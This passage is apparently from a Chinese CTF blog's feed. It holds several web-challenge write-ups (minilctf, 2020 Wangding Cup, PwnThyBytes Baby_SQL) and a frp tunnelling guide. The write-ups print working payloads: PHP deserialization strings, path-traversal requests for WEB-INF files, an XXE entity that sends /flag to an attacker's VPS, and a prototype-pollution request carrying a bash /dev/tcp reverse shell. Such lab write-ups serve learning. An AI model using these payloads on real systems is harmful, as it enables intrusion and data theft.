proxy_set_header X-Real-IP $remote_addr;</span>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;across the great ... nope&#x27;</span>);        &#125;    &#125;&#125;</code></pre><p>payload:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">github</span> </span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&#x27;</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;index.php&quot;</span>;&#125;<span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> github());</code></pre><p><img src="https://s1.ax1x.com/2020/05/16/Y6HBOH.png" alt="Y6HBOH.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>minilctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020网鼎杯</title>
    <link href="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
    <url>/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<blockquote><p>啥时候像队里师傅那么厉害就好了，我爬</p></blockquote><h1 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h1><p>在下载的页面可以读取任意文件(当然/flag读不到)，先读下WEB-INF</p><pre><code class="hljs gradle"><span class="hljs-regexp">/file_in_java/</span>DownloadServlet?filename=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>web.xmlWEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF<span class="hljs-regexp">/classes/</span> : 一般用来存放Java类文件(.<span class="hljs-keyword">class</span>)WEB-INF<span class="hljs-regexp">/lib/</span> : 用来存放打包好的库(.jar)WEB-INF<span class="hljs-regexp">/src/</span> : 用来放源代码(.asp和.php等)</code></pre><p>可以按照xml中的内容找到WEB-INF/classes/下的classes文件</p><p>如</p><pre><code class="hljs gradle">cn.abc.servlet.UploadServletcn.abc.servlet.ListFileServletcn.abc.servlet.DownloadServlet?filename=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>classes<span class="hljs-regexp">/cn/</span>abc<span class="hljs-regexp">/servlet/U</span>ploadServlet.<span class="hljs-keyword">class</span>?filename=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>classes<span class="hljs-regexp">/cn/</span>abc<span class="hljs-regexp">/servlet/</span>ListFileServlet.<span class="hljs-keyword">class</span>?filename=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>classes<span class="hljs-regexp">/cn/</span>abc<span class="hljs-regexp">/servlet/</span>DownloadServlet.<span class="hljs-keyword">class</span></code></pre><p>用jd-gui反编译后，代码审计发现可以利用CVE-2019-12415  xxe读文件，但对文件名有限制</p><p><img src="https://s1.ax1x.com/2020/05/10/Y8Iwn0.png" alt="Y8Iwn0.png"></p><p>解析为xml的话会要求文件名为”excel-“开头，那我们就构造<code>excel-2.xlsx</code>就可以加以利用</p><p>cve-20190-12415的利用方法很多，这里我们用<a href="https://github.com/joernchen/xxeserve">xxeserve</a>这个工具</p><p>先将<code>excel-2.xlsx</code>改为<code>excel-2.zip</code>解压，将下面代码填入自己的vps后放到<code>[Content_Types].xml</code>文件中</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://vps:port/xml?f=/flag&quot;</span>&gt;</span></span><span class="hljs-meta">%remote;</span><span class="hljs-meta">%int;</span><span class="hljs-meta">%trick;]&gt;</span></code></pre><p><img src="https://s1.ax1x.com/2020/05/10/Y8olvR.png" alt="Y8olvR.png"></p><p>再压缩为zip，改名为<code>excel-2.xlsx</code></p><p>Kali 下利用xxeserve（我的kali 7001端口用frp穿透到了vps7001端口）监听，然后上传<code>excel-2.xlsx</code>读文件</p><p><img src="https://s1.ax1x.com/2020/05/11/Y8ogIS.png" alt="Y8ogIS.png"></p><p>flag到手 hahaha</p><p>这里有个坑 kali下ruby没<code>sinatra</code>,需要<code>gem install sinatra</code></p><h1 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h1><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;process();       &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;            <span class="hljs-keyword">$this</span>-&gt;write();               &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;            <span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;read();            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-variable">$res</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);                <span class="hljs-keyword">die</span>();            &#125;            <span class="hljs-variable">$res</span> = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;            <span class="hljs-variable">$res</span> = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;process();    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)        <span class="hljs-keyword">if</span>(!(ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];    <span class="hljs-keyword">if</span>(is_valid(<span class="hljs-variable">$str</span>)) &#123;        <span class="hljs-variable">$obj</span> = unserialize(<span class="hljs-variable">$str</span>);    &#125;&#125;</code></pre><p>本来很简单的反序列化读取，但是直接读flag.php的话死活读不出来困死了，最后从y1ng师傅博客得知读取/proc/self/cmdline得到了配置文件，得到了httpd.conf的绝对路径读到了<code>/web/html/</code>web目录，接下来直接读<code>/web/html/flag.php</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/web/html/flag.php&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;a&quot;</span>;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> FileHandler();<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);</code></pre><p>赛后交流还发现了好几种payload</p><pre><code class="hljs php">O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;/web/html/flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre><p>这里就很奇怪了，然后y1ng师傅抛出了解答，反序列化没有异常的话会穿越到根目录，像上面的payload都会在反序列化的时候异常</p><p>可以参考y1ng师傅的博客 <a href="https://www.gem-love.com/websecurity/2322.html">https://www.gem-love.com/websecurity/2322.html</a></p><p>ps. 有个知识点，序列化中大写S,<code>\00</code>会被解析成<code>%00</code>一个字符，小写s,<code>\00</code>不会被解析还是3个字符</p><h1 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h1><p>给了源码</p><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<span class="hljs-keyword">var</span> app = express();<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Notes</span> </span>&#123;    <span class="hljs-function"><span class="hljs-title">constructor</span>(<span class="hljs-params"></span>)</span> &#123;        <span class="hljs-built_in">this</span>.owner = <span class="hljs-string">&quot;whoknows&quot;</span>;        <span class="hljs-built_in">this</span>.num = <span class="hljs-number">0</span>;        <span class="hljs-built_in">this</span>.note_list = &#123;&#125;;    &#125;    <span class="hljs-function"><span class="hljs-title">write_note</span>(<span class="hljs-params">author, raw_note</span>)</span> &#123;        <span class="hljs-built_in">this</span>.note_list[(<span class="hljs-built_in">this</span>.num++).toString()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;    &#125;    <span class="hljs-function"><span class="hljs-title">get_note</span>(<span class="hljs-params">id</span>)</span> &#123;        <span class="hljs-keyword">var</span> r = &#123;&#125;        undefsafe(r, id, undefsafe(<span class="hljs-built_in">this</span>.note_list, id));        <span class="hljs-keyword">return</span> r;    &#125;    <span class="hljs-function"><span class="hljs-title">edit_note</span>(<span class="hljs-params">id, author, raw</span>)</span> &#123;        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);    &#125;    <span class="hljs-function"><span class="hljs-title">get_all_notes</span>(<span class="hljs-params"></span>)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.note_list;    &#125;    <span class="hljs-function"><span class="hljs-title">remove_note</span>(<span class="hljs-params">id</span>)</span> &#123;        <span class="hljs-keyword">delete</span> <span class="hljs-built_in">this</span>.note_list[id];    &#125;&#125;<span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> Notes();notes.write_note(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);app.set(<span class="hljs-string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);app.use(express.json());app.use(express.urlencoded(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));app.use(express.static(path.join(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;  res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);&#125;);app.route(<span class="hljs-string">&#x27;/add_note&#x27;</span>)    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);    &#125;)    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;        <span class="hljs-keyword">let</span> author = req.body.author;        <span class="hljs-keyword">let</span> raw = req.body.raw;        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;            notes.write_note(author, raw);            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);        &#125; <span class="hljs-keyword">else</span> &#123;            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);        &#125;    &#125;)app.route(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);    &#125;)    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;        <span class="hljs-keyword">let</span> id = req.body.id;        <span class="hljs-keyword">let</span> author = req.body.author;        <span class="hljs-keyword">let</span> enote = req.body.raw;        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;            notes.edit_note(id, author, enote);            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);        &#125; <span class="hljs-keyword">else</span> &#123;            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);        &#125;    &#125;)app.route(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);    &#125;)    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;        <span class="hljs-keyword">let</span> id = req.body.id;        <span class="hljs-keyword">if</span> (id) &#123;            notes.remove_note(id);            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);        &#125; <span class="hljs-keyword">else</span> &#123;            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);        &#125;    &#125;)app.route(<span class="hljs-string">&#x27;/notes&#x27;</span>)    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;        <span class="hljs-keyword">let</span> q = req.query.q;        <span class="hljs-keyword">let</span> a_note;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;            a_note = notes.get_all_notes();        &#125; <span class="hljs-keyword">else</span> &#123;            a_note = notes.get_note(q);        &#125;        res.render(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);    &#125;)app.route(<span class="hljs-string">&#x27;/status&#x27;</span>)    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;        <span class="hljs-keyword">let</span> commands = &#123;            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span>        &#125;;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;            exec(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;                <span class="hljs-keyword">if</span> (err) &#123;                    <span class="hljs-keyword">return</span>;                &#125;                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);            &#125;);        &#125;        res.send(<span class="hljs-string">&#x27;OK&#x27;</span>);        res.end();    &#125;)app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;  res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);&#125;);app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) </span>&#123;  <span class="hljs-built_in">console</span>.error(err.stack);  res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);&#125;);<span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;app.listen(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))</code></pre><p>undefsafe的原型链污染</p><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">edit_note</span>(<span class="hljs-params">id, author, raw</span>)</span> &#123;    undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);    undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);&#125;</code></pre><p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p><p>edit_notet提交</p><pre><code class="hljs json">&#123;        &#x27;id&#x27;: &#x27;__proto__&#x27;,        &#x27;author&#x27;: &#x27;bash -i &gt;&amp; /dev/tcp/ip/7001 0&gt;&amp;1&#x27;,        &#x27;raw&#x27;: &#x27;ls&#x27;    &#125;</code></pre><p>再访问status导致rce，反弹shell直接cat /flag即可</p><h1 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h1><p>这题也没做出来，被只能写20条数据困死了，后来队里师傅说一遍sleep一边让他插入失败就可以正常进行盲注，学到了学到了。</p><p><img src="https://s1.ax1x.com/2020/05/11/YGioOP.png" alt="YGioOP.png"></p><p>sleep(2)返回0，exp(sleep(2)+1000)会溢出报错，但sleep(2)仍然会执行</p><p>由于环境关了，没能复现成功，下面应该是无列名注入找flag了，等buu上题复现qwq</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Frp使用</title>
    <link href="/2020/05/10/Frp%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/05/10/Frp%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="关于frp"><a href="#关于frp" class="headerlink" title="关于frp"></a>关于frp</h1><p>简单地说，<a href="https://github.com/fatedier/frp/blob/master/README_zh.md">frp</a>就是一个<a href="https://www.zhihu.com/question/24723688">反向代理软件</a>，它体积轻量但功能很强大，可以<strong>使处于内网或防火墙后的设备对外界提供服务</strong>，它支持HTTP、TCP、UDP等众多协议。</p><p>内网穿透，将你机器上的端口放到vps上</p><p><a href="https://github.com/fatedier/frp/">https://github.com/fatedier/frp/</a></p><h1 id="服务端搭建"><a href="#服务端搭建" class="headerlink" title="服务端搭建"></a>服务端搭建</h1><ol><li><p>下载，解压到一个文件夹</p><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxvf frp_<span class="hljs-number">0</span>.<span class="hljs-number">22</span>.<span class="hljs-number">0</span>_linux_amd<span class="hljs-number">64</span>.tar.gz<span class="hljs-attribute">cp</span> -r frp_<span class="hljs-number">0</span>.<span class="hljs-number">22</span>.<span class="hljs-number">0</span>_linux_amd<span class="hljs-number">64</span> frp<span class="hljs-attribute">cd</span> frp</code></pre></li><li><p>编写配置文件，及其运行</p><pre><code class="hljs makefile">服务端写  frps.ini<span class="hljs-comment"># frps.ini</span>[common]bind_port = 7000 <span class="hljs-comment">#frp的端口</span>dashboard_port = 7500 <span class="hljs-comment">#图形化的客户端</span>token = 12345678   <span class="hljs-comment">#客户端连接凭证</span>dashboard_user = admin <span class="hljs-comment">#登录图形化的账号密码</span>dashboard_pwd = admin</code></pre></li><li><p>运行</p><p>nohup ./frps -c frps.ini &amp;  使用 <a href="https://ehlxr.me/2017/01/18/Linux-%E7%9A%84-nohup-%E5%91%BD%E4%BB%A4%E7%9A%84%E7%94%A8%E6%B3%95/">nohup命令</a>将其运行在后台<br>jobs                                        可以看运行情况</p></li></ol><h1 id="客户端搭建"><a href="#客户端搭建" class="headerlink" title="客户端搭建"></a>客户端搭建</h1><ol><li><p>下载，解压到一个文件夹</p><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxvf frp_<span class="hljs-number">0</span>.<span class="hljs-number">22</span>.<span class="hljs-number">0</span>_linux_amd<span class="hljs-number">64</span>.tar.gz<span class="hljs-attribute">cp</span> -r frp_<span class="hljs-number">0</span>.<span class="hljs-number">22</span>.<span class="hljs-number">0</span>_linux_amd<span class="hljs-number">64</span> frp<span class="hljs-attribute">cd</span> frp</code></pre></li><li><p>编写配置文件，及其运行</p><pre><code class="hljs makefile">服务端写  frpc.ini<span class="hljs-comment"># frpc.ini</span>[common]server_addr = x.x.x.x  <span class="hljs-comment">#vps地址</span>server_port = 7000token = 12345678[rdp]type = tcplocal_ip = 127.0.0.1           local_port = 3389   <span class="hljs-comment">#本地端口</span>remote_port = 7001  <span class="hljs-comment">#vps上映射的端口</span>[smb]type = tcplocal_ip = 127.0.0.1local_port = 445remote_port = 7002</code></pre></li><li><p>运行</p><p>nohup ./frpc -c frpc.ini &amp;  使用 <a href="https://ehlxr.me/2017/01/18/Linux-%E7%9A%84-nohup-%E5%91%BD%E4%BB%A4%E7%9A%84%E7%94%A8%E6%B3%95/">nohup命令</a>将其运行在后台<br>jobs                                        可以看运行情况</p></li></ol><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>客户端上 nc -lvvp 7001</p><p>访问 vps ip:7001</p><p>客户端上有回显的化说明可以了</p><p>参考：<a href="https://sspai.com/post/52523">https://sspai.com/post/52523</a></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Frp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[PwnThyBytes 2019]Baby_SQL</title>
    <link href="/2020/05/08/PwnThyBytes-2019-Baby-SQL/"/>
    <url>/2020/05/08/PwnThyBytes-2019-Baby-SQL/</url>
    
    <content type="html"><![CDATA[<p>看看源码index.php中有这么一句</p><pre><code class="hljs arcade"><span class="hljs-keyword">return</span> addslashes(<span class="hljs-symbol">$value</span>);</code></pre><p>没有什么好用的方法绕过去，再看login.php中没有addslashes过滤，是不是可以直接访问这个进行注入，但有这样一句</p><pre><code class="hljs php">!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>) <span class="hljs-keyword">AND</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Direct access on this script is not allowed!&quot;</span>);</code></pre><p>可以利用PHP_SESSION_UPLOAD_PROGRESS绕</p><p><a href="https://www.php.net/manual/zh/session.upload-progress.php#session.upload-progress">https://www.php.net/manual/zh/session.upload-progress.php#session.upload-progress</a></p><p>python下测测</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://f8623bdf-89da-4fc0-aa78-40b432183998.node3.buuoj.cn/templates/login.php&quot;</span>files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;a = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,                  cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>&#125;,                  proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>: <span 